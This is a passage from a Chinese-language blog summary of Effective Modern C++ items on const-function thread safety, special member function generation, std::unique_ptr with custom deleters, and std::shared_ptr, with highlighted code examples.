m;<br>    <span class="hljs-keyword">mutable</span> <span class="hljs-keyword">bool</span> rootsAreValid &#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-keyword">mutable</span> RootsType rootsVals &#123;&#125;;<br>&#125;;<br></code></pre></div></td></tr></table></figure><blockquote><p><code>std::mutex</code>既不可移动，也不可复制。因而包含他们的类也同时是不可移动和不可复制的</p></blockquote><p>在某些情况下，互斥量的副作用显会得过大。例如，如果你所做的只是计算成员函数被调用了多少次，使用<code>std::atomic</code>修饰的计数器通常会是一个开销更小的方法（当然是否更小，取决于你使用的硬件和标准库对互斥量的实现）。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span> &#123;</span>                                   <span class="hljs-comment">//2D点</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">distanceFromOrigin</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">noexcept</span>  <span class="hljs-comment">//noexcept的使用</span></span><br><span class="hljs-function">    </span>&#123;                                           <br>        ++callCount;                            <span class="hljs-comment">//atomic的递增</span><br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">sqrt</span>((x * x) + (y * y));<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">mutable</span> <span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">unsigned</span>&gt; callCount&#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">double</span> x, y;<br>&#125;;<br></code></pre></div></td></tr></table></figure><blockquote><p>与 <code>std::mutex</code> 类似的，实际上 <code>std::atomic</code>既不可移动，也不可复制。因而包含他们的类也同时是不可移动和不可复制的</p></blockquote><p>但是只使用 <code>std::atomic</code> 存在以下问题：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">magicValue</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (cacheValid) <span class="hljs-keyword">return</span> cachedValue;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">auto</span> val1 = expensiveComputation1();<br>            <span class="hljs-keyword">auto</span> val2 = expensiveComputation2();<br>            cachedValue = val1 + val2;              <span class="hljs-comment">//第一步</span><br>            cacheValid = <span class="hljs-literal">true</span>;                      <span class="hljs-comment">//第二步</span><br>            <span class="hljs-keyword">return</span> cachedValid;<br>        &#125;<br>    &#125;<br>    <br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">mutable</span> <span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">bool</span>&gt; cacheValid&#123; <span class="hljs-literal">false</span> &#125;;<br>    <span class="hljs-keyword">mutable</span> <span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">int</span>&gt; cachedValue;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>仍然可能出现重复计算。考虑：</p><ul><li>一个线程调用<code>Widget::magicValue</code>，将<code>cacheValid</code>视为<code>false</code>，执行这两个昂贵的计算，并将它们的和分配给<code>cachedValue</code>。</li><li>此时，第二个线程调用<code>Widget::magicValue</code>，也将<code>cacheValid</code>视为<code>false</code>，因此执行刚才完成的第一个线程相同的计算。（这里的“第二个线程”实际上可能是其他<strong>几个</strong>线程。）</li></ul><p>这种行为与使用缓存的目的背道而驰。将<code>cachedValue</code>和<code>CacheValid</code>的赋值顺序交换可以解决这个问题，但结果会更糟。</p><p>假设<code>cacheValid</code>是false，那么：</p><ul><li>一个线程调用<code>Widget::magicValue</code>，刚执行完将<code>cacheValid</code>设置<code>true</code>的语句。</li><li>在这时，第二个线程调用<code>Widget::magicValue</code>，检查<code>cacheValid</code>。看到它是<code>true</code>，就返回<code>cacheValue</code>，即使第一个线程还没有给它赋值。因此返回的值是不正确的。</li></ul><p>对于需要同步的是单个的变量或者内存位置，使用<code>std::atomic</code>就足够了。不过，一旦你需要对两个以上的变量或内存位置作为一个单元来操作的话，就应该使用互斥量。</p><h3><span id="结论">结论</span></h3><ul><li>确保<code>const</code>成员函数线程安全（先得明白什么是线程不安全），除非你<strong>确定</strong>它们永远不会在并发上下文（<em>concurrentcontext</em>）中使用。</li><li>使用<code>std::atomic</code>变量可能比互斥量提供更好的性能，但是它只适合操作单个变量或内存位置。</li></ul><h2><span id="17-理解特殊成员函数的生成">17 理解特殊成员函数的生成</span></h2><p>C++98有四个：默认构造函数，析构函数，拷贝构造函数，拷贝赋值运算符。默认构造函数仅在类完全没有构造函数的时候才生成。</p><p>C++11特殊成员函数俱乐部迎来了两位新会员：移动构造函数和移动赋值运算符。它们的签名是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    Widget(Widget&amp;&amp; rhs);               <span class="hljs-comment">//移动构造函数</span><br>    Widget&amp; <span class="hljs-keyword">operator</span>=(Widget&amp;&amp; rhs);    <span class="hljs-comment">//移动赋值运算符</span><br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>移动操作仅在需要的时候生成，如果生成了，就会对类的non-static数据成员执行逐成员的移动。</p><p>逐成员移动的核心是对对象使用<code>std::move</code>，然后函数决议时会选择执行移动还是拷贝操作。记住如果支持移动就会逐成员移动类成员和基类成员，如果不支持移动就执行拷贝操作就好了。</p><h3><span id="拷贝构造与移动构造生成方式">拷贝构造与移动构造生成方式</span></h3><p>如果你声明一个拷贝构造函数，但是没有声明拷贝赋值运算符，如果写的代码用到了拷贝赋值，编译器会帮助你生成拷贝赋值运算符。同样的，如果你声明拷贝赋值运算符但是没有拷贝构造函数，代码用到拷贝构造函数时编译器就会生成它。</p><p>两个移动操作不是相互独立的。如果你声明了其中一个，编译器就不再生成另一个。如果你给类声明了，比如，一个移动构造函数，就表明对于移动操作应怎样实现，与编译器应生成的默认逐成员移动有些区别。如果逐成员移动构造有些问题，那么逐成员移动赋值同样也可能有问题。所以声明移动构造函数阻止移动赋值运算符的生成，声明移动赋值运算符同样阻止编译器生成移动构造函数。</p><p>如果一个类显式声明了拷贝操作，编译器就不会生成移动操作。这种限制的解释是如果声明拷贝操作（构造或者赋值）就暗示着平常拷贝对象的方法（逐成员拷贝）不适用于该类，编译器会明白如果逐成员拷贝对拷贝操作来说不合适，逐成员移动也可能对移动操作来说不合适。</p><h3><span id="rule-of-three">Rule of Three</span></h3><p>如果你声明了拷贝构造函数，拷贝赋值运算符，或者析构函数三者之一，你应该也声明其余两个。</p><p>如果一个类显式声明了拷贝操作，编译器就不会生成移动操作。所以，C++11不会为那些有用户定义的析构函数的类生成移动操作。</p><p>仅当下面条件成立时才会生成移动操作（当需要时）：</p><ul><li>类中没有拷贝操作</li><li>类中没有移动操作</li><li>类中没有用户定义的析构</li></ul><p>假设编译器生成的函数行为是正确的（即逐成员拷贝类non-static数据是你期望的行为），你的工作很简单，C++11的<code>= default</code>就可以表达你想做的：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br>    <span class="hljs-keyword">public</span>:<br>    … <br>    ~Widget();                              <span class="hljs-comment">//用户声明的析构函数</span><br>    …                                       <span class="hljs-comment">//默认拷贝构造函数</span><br>    Widget(<span class="hljs-keyword">const</span> Widget&amp;) = <span class="hljs-keyword">default</span>;        <span class="hljs-comment">//的行为还可以</span><br><br>    Widget&amp;                                 <span class="hljs-comment">//默认拷贝赋值运算符</span><br>        <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Widget&amp;) = <span class="hljs-keyword">default</span>; <span class="hljs-comment">//的行为还可以</span><br>    … <br>&#125;;<br></code></pre></div></td></tr></table></figure><p>就算编译器乐于为你的类生成拷贝和移动操作，生成的函数也如你所愿，你也应该手动声明它们然后加上<code>= default</code>。这看起来比较多余，但是它让你的意图更明确，也能帮助你避免一些微妙的bug。</p><p>声明析构有潜在的副作用：它阻止了移动操作的生成。然而，拷贝操作的生成是不受影响的。所以手动声明为<code>=default</code> 是有意义的。</p><h3><span id="c11-处理规则">C++11 处理规则</span></h3><ul><li><strong>默认构造函数</strong>：和C++98规则相同。仅当类不存在用户声明的构造函数时才自动生成。</li><li><strong>析构函数</strong>：基本上和C++98相同；稍微不同的是现在析构默认<code>noexcept</code>（参见<a href="../3.MovingToModernCpp/item14.md">Item14</a>）。和C++98一样，仅当基类析构为虚函数时该类析构才为虚函数。</li><li><strong>拷贝构造函数</strong>：和C++98运行时行为一样：逐成员拷贝non-static数据。仅当类没有用户定义的拷贝构造时才生成。如果类声明了移动操作它就是<em>delete</em>的。但是，当用户声明了拷贝赋值或者析构，该函数自动生成已被废弃。</li><li><strong>拷贝赋值运算符</strong>：和C++98运行时行为一样：逐成员拷贝赋值non-static数据。仅当类没有用户定义的拷贝赋值时才生成。如果类声明了移动操作它就是<em>delete</em>的。但是，当用户声明了拷贝构造或者析构，该函数自动生成已被废弃。</li><li><strong>移动构造函数</strong>和<strong>移动赋值运算符</strong>：都对非static数据执行逐成员移动。仅当类没有用户定义的拷贝操作，移动操作或析构时才自动生成。</li></ul><h3><span id="结论">结论</span></h3><ul><li>特殊成员函数是编译器可能自动生成的函数：默认构造函数，析构函数，拷贝操作，移动操作。</li><li>移动操作仅当类没有显式声明移动操作，拷贝操作，析构函数时才自动生成。</li><li>拷贝构造函数仅当类没有显式声明拷贝构造函数时才自动生成，并且如果用户声明了移动操作，拷贝构造就是<em>delete</em>。</li><li>拷贝赋值运算符仅当类没有显式声明拷贝赋值运算符时才自动生成，并且如果用户声明了移动操作，拷贝赋值运算符就是<em>delete</em>。当用户声明了析构函数，拷贝操作的自动生成已被废弃。</li><li>成员函数模板不抑制特殊成员函数的生成。</li></ul><h2><span id="18-对独占资源使用stdunique_ptr">18 对独占资源使用<code>std::unique_ptr</code></span></h2><p>默认情况下，<code>std::unique_ptr</code>大小等同于原始指针，而且对于大多数操作（包括取消引用），他们执行的指令完全相同。这意味着你甚至可以在内存和时间都比较紧张的情况下使用它。如果原始指针够小够快，那么<code>std::unique_ptr</code>一样可以。</p><p><code>std::unique_ptr</code>体现了专有所有权（<em>exclusiveownership</em>）语义。</p><p>一个non-null<code>std::unique_ptr</code>始终拥有其指向的内容。移动一个<code>std::unique_ptr</code>将所有权从源指针转移到目的指针。（源指针被设为null）</p><p>拷贝一个<code>std::unique_ptr</code>是不允许的，因为如果你能拷贝一个<code>std::unique_ptr</code>，你会得到指向相同内容的两个<code>std::unique_ptr</code>，每个都认为自己拥有（并且应当最后销毁）资源，销毁时就会出现重复销毁。</p><p>因此，<code>std::unique_ptr</code>是一种只可移动类型（<em>move-onlytype</em>）。当析构时，一个non-null<code>std::unique_ptr</code>销毁它指向的资源。默认情况下，资源析构通过对<code>std::unique_ptr</code>里原始指针调用<code>delete</code>来实现。</p><p><code>Investment</code>继承关系的工厂函数可以这样声明：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Ts&gt;            <span class="hljs-comment">//返回指向对象的std::unique_ptr，</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Investment&gt;         <span class="hljs-comment">//对象使用给定实参创建</span><br>makeInvestment(Ts&amp;&amp;... params);<br></code></pre></div></td></tr></table></figure><p>调用者应该在单独的作用域中使用返回的<code>std::unique_ptr</code>智能指针：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">&#123;<br>    …<br>    <span class="hljs-keyword">auto</span> pInvestment =                  <span class="hljs-comment">//pInvestment是</span><br>        makeInvestment( arguments );    <span class="hljs-comment">//std::unique_ptr&lt;Investment&gt;类型</span><br>    …<br>&#125;                                       <span class="hljs-comment">//销毁 *pInvestment</span><br></code></pre></div></td></tr></table></figure><p><code>std::unique_ptr</code>将保证指向内容的析构函数被调用，销毁对应资源。</p><p>这个规则也有些例外。大多数情况发生于不正常的程序终止。</p><p>如果一个异常传播到线程的基本函数，比如程序初始线程的<code>main</code>函数外，或者违反<code>noexcept</code>说明，局部变量可能不会被销毁；如果<code>std::abort</code>或者退出函数（如<code>std::_Exit</code>，<code>std::exit</code>，或<code>std::quick_exit</code>）被调用，局部变量一定没被销毁。</p><h3><span id="自定义删除器">自定义删除器</span></h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> delInvmt = [](Investment* pInvestment)         <span class="hljs-comment">//自定义删除器</span><br>                &#123;                                   <span class="hljs-comment">//（lambda表达式）</span><br>                    makeLogEntry(pInvestment);<br>                    <span class="hljs-keyword">delete</span> pInvestment; <br>                &#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Ts&gt;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Investment, <span class="hljs-keyword">decltype</span>(delInvmt)&gt;     <span class="hljs-comment">//更改后的返回类型</span><br>makeInvestment(Ts&amp;&amp;... params)<br>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Investment, <span class="hljs-keyword">decltype</span>(delInvmt)&gt; <span class="hljs-comment">//应返回的指针</span><br>        pInv(<span class="hljs-literal">nullptr</span>, delInvmt);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-comment">/*一个Stock对象应被创建*/</span>)<br>    &#123;<br>        pInv.reset(<span class="hljs-keyword">new</span> Stock(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...));<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-comment">/*一个Bond对象应被创建*/</span> )   <br>    &#123;     <br>        pInv.reset(<span class="hljs-keyword">new</span> Bond(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...));   <br>    &#125;   <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-comment">/*一个RealEstate对象应被创建*/</span> )   <br>    &#123;     <br>        pInv.reset(<span class="hljs-keyword">new</span> RealEstate(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...));   <br>    &#125;   <br>    <span class="hljs-keyword">return</span> pInv;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述代码中：</p><ul><li><code>delInvmt</code>是从<code>makeInvestment</code>返回的对象的自定义的删除器。</li><li>删除器类型必须作为第二个类型实参传给<code>std::unique_ptr</code>。</li><li>尝试将原始指针（比如<code>new</code>创建）赋值给<code>std::unique_ptr</code>通不过编译，因为是一种从原始指针到智能指针的隐式转换。这种隐式转换会出问题，所以C++11的智能指针禁止这个行为。这就是通过<code>reset</code>来让<code>pInv</code>接管通过<code>new</code>创建的对象的所有权的原因。</li><li>使用<code>new</code>时，我们使用<code>std::forward</code>把传给<code>makeInvestment</code>的实参完美转发出去。</li><li>自定义删除器的一个形参，类型是<code>Investment*</code>，不管在<code>makeInvestment</code>内部创建的对象的真实类型（如<code>Stock</code>，<code>Bond</code>，或<code>RealEstate</code>）是什么，它最终在<em>lambda</em>表达式中，作为<code>Investment*</code>对象被删除。这意味着我们通过基类指针删除派生类实例，为此，基类<code>Investment</code>必须有虚析构函数。</li></ul><p>C++14中，存在返回类型推导，写法更为简单：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Ts&gt;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">makeInvestment</span><span class="hljs-params">(Ts&amp;&amp;... params)</span>                 <span class="hljs-comment">//C++14</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> delInvmt = [](Investment* pInvestment)     <span class="hljs-comment">//现在在</span><br>                    &#123;                               <span class="hljs-comment">//makeInvestment里</span><br>                        makeLogEntry(pInvestment);<br>                        <span class="hljs-keyword">delete</span> pInvestment; <br>                    &#125;;<br><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Investment, <span class="hljs-keyword">decltype</span>(delInvmt)&gt; <span class="hljs-comment">//同之前一样</span><br>        pInv(<span class="hljs-literal">nullptr</span>, delInvmt);<br>    <span class="hljs-keyword">if</span> ( … )                                        <span class="hljs-comment">//同之前一样</span><br>    &#123;<br>        pInv.reset(<span class="hljs-keyword">new</span> Stock(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...));<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( … )                                   <span class="hljs-comment">//同之前一样</span><br>    &#123;     <br>        pInv.reset(<span class="hljs-keyword">new</span> Bond(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...));   <br>    &#125;   <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( … )                                   <span class="hljs-comment">//同之前一样</span><br>    &#123;     <br>        pInv.reset(<span class="hljs-keyword">new</span> RealEstate(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...));   <br>    &#125;   <br>    <span class="hljs-keyword">return</span> pInv;                                    <span class="hljs-comment">//同之前一样</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>当使用默认删除器时（如<code>delete</code>），你可以合理假设<code>std::unique_ptr</code>对象和原始指针大小相同。</p><p>但是当自定义删除器时，情况可能不再如此。函数指针形式的删除器，通常会使<code>std::unique_ptr</code>的从一个字（<em>word</em>）大小增加到两个。这可能导致<code>std::unique_ptr</code>对象变得过大。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">delInvmt2</span><span class="hljs-params">(Investment* pInvestment)</span>             <span class="hljs-comment">//函数形式的</span></span><br><span class="hljs-function"></span>&#123;                                                   <span class="hljs-comment">//自定义删除器</span><br>    makeLogEntry(pInvestment);<br>    <span class="hljs-keyword">delete</span> pInvestment;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Ts&gt;                            <span class="hljs-comment">//返回类型大小是</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Investment, <span class="hljs-keyword">void</span> (*)(Investment*)&gt;  <span class="hljs-comment">//Investment*的指针</span><br>makeInvestment(Ts&amp;&amp;... params);                     <span class="hljs-comment">//加至少一个函数指针的大小</span><br></code></pre></div></td></tr></table></figure><p>对于函数对象形式的删除器来说，变化的大小取决于函数对象中存储的状态多少，无状态函数（statelessfunction）对象（比如不捕获变量的<em>lambda</em>表达式）对大小没有影响，这意味当自定义删除器可以实现为函数或者<em>lambda</em>时，尽量使用<em>lambda</em>。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> delInvmt1 = [](Investment* pInvestment)        <span class="hljs-comment">//无状态lambda的</span><br>                 &#123;                                  <span class="hljs-comment">//自定义删除器</span><br>                     makeLogEntry(pInvestment);<br>                     <span class="hljs-keyword">delete</span> pInvestment; <br>                 &#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Ts&gt;                            <span class="hljs-comment">//返回类型大小是</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Investment, <span class="hljs-keyword">decltype</span>(delInvmt1)&gt;    <span class="hljs-comment">//Investment*的大小</span><br>makeInvestment(Ts&amp;&amp;... args);<br></code></pre></div></td></tr></table></figure><h3><span id="向-stdshared_ptr的自动转化">向 <code>std::shared_ptr</code>的自动转化</span></h3><p><code>std::unique_ptr</code>是C++11中表示专有所有权的方法，但是其最吸引人的功能之一是它可以轻松高效的转换为<code>std::shared_ptr</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Investment&gt; sp =            <span class="hljs-comment">//将std::unique_ptr</span><br>    makeInvestment(arguments);              <span class="hljs-comment">//转为std::shared_ptr</span><br></code></pre></div></td></tr></table></figure><p>这就是<code>std::unique_ptr</code>非常适合用作工厂函数返回类型的原因的关键部分。工厂函数无法知道调用者是否要对它们返回的对象使用专有所有权语义，或者共享所有权（即<code>std::shared_ptr</code>）是否更合适。</p><h3><span id="结论">结论</span></h3><ul><li><code>std::unique_ptr</code>是轻量级、快速的、只可移动（<em>move-only</em>）的管理专有所有权语义资源的智能指针</li><li>默认情况，资源销毁通过<code>delete</code>实现，但是支持自定义删除器。有状态的删除器（捕获变量的<em>lambda</em>表达式）和函数指针（带参数）会增加<code>std::unique_ptr</code>对象的大小。所以是一般使用无状态的<code>lambda</code> 表达式</li><li>将<code>std::unique_ptr</code>转化为<code>std::shared_ptr</code>非常简单</li></ul><h2><span id="19对于共享资源使用stdshared_ptr">19对于共享资源使用<code>std::shared_ptr</code></span></h2><p><code>std::shared_ptr</code>通过引用计数（<em>referencecount</em>）来确保它是否是最后一个指向某种资源的指针，引用计数关联资源并跟踪有多少<code>std::shared_ptr</code>指向该资源。如果<code>std::shared_ptr</code>在计数值递减后发现引用计数值为零，没有其他<code>std::shared_ptr</code>指向该资源，它就会销毁资源。</p><p>引用计数暗示着性能问题：</p><ul><li><strong><code>std::shared_ptr</code>大小是原始指针的两倍</strong>，因为它内部包含一个指向资源的原始指针，还包含一个指向资源的引用计数值的原始指针。</li><li><strong>引用计数的内存几乎使用动态分配</strong>。<code>std::make_shared</code>创建<code>std::shared_ptr</code>可以避免引用计数的动态分配，但是还存在一些<code>std::make_shared</code>不能使用的场景，这时候引用计数就会动态分配。</li><li><strong>递增递减引用计数必须是原子性的</strong>，因为多个reader、writer可能在不同的线程。比如，指向某种资源的<code>std::shared_ptr</code>可能在一个线程执行析构（于是递减指向的对象的引用计数），在另一个不同的线程，<code>std::shared_ptr</code>指向相同的对象，但是执行的却是拷贝操作（因此递增了同一个引用计数）。原子操作通常比非原子操作要慢，所以即使引用计数通常只有一个<em>word</em>大小，你也应该假定读写它们是存在开销的。</li></ul><p>移动<code>std::shared_ptr</code>会比拷贝它要快：拷贝要求递增引用计数值，移动不需要。移动赋值运算符同理，所以移动构造比拷贝构造快，移动赋值运算符也比拷贝赋值运算符快。</p><h3><span id="与-stdunique_ptr的区别">与 <code>std::unique_ptr</code>的区别</span></h3><p><code>std::shared_ptr</code>使用<code>delete</code>作为资源的默认销毁机制，但是它也支持自定义的删除器。这种支持有别于<code>std::unique_ptr</code>。对于<code>std::unique_ptr</code>来说，删除器类型是智能指针类型的一部分。对于<code>std::shared_ptr</code>则不是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs CPP"><span class="hljs-keyword">auto</span> loggingDel = [](Widget *pw)        <span class="hljs-comment">//自定义删除器</span><br>                  &#123;                    <br>                      makeLogEntry(pw);<br>                      <span class="hljs-keyword">delete</span> pw;<br>                  &#125;;<br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;                        <span class="hljs-comment">//删除器类型是</span><br>    Widget, <span class="hljs-keyword">decltype</span>(loggingDel)        <span class="hljs-comment">//指针类型的一部分</span><br>    &gt; upw(<span class="hljs-keyword">new</span> Widget, loggingDel);<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;                 <span class="hljs-comment">//删除器类型不是</span><br>    spw(<span class="hljs-keyword">new</span> Widget, loggingDel);        <span class="hljs-comment">//指针类型的一部分</span><br></code></pre></div></td></tr></table></figure><p><code>std::shared_ptr</code>的设计更为灵活。考虑有两个<code>std::shared_ptr&lt;Widget&gt;</code>，每个自带不同的删除器（比如通过<em>lambda</em>表达式自定义删除器）：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs CPP"><span class="hljs-keyword">auto</span> customDeleter1 = [](Widget *pw) &#123; … &#125;;     <span class="hljs-comment">//自定义删除器，</span><br><span class="hljs-keyword">auto</span> customDeleter2 = [](Widget *pw) &#123; … &#125;;     <span class="hljs-comment">//每种类型不同</span><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">pw1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget, customDeleter1)</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">pw2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget, customDeleter2)</span></span>;<br></code></pre></div></td></tr></table></figure><p>因为 <code>pw1</code> 和 <code>pw2</code>有相同的类型，所以它们都可以放到存放那个类型的对象的容器中：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td 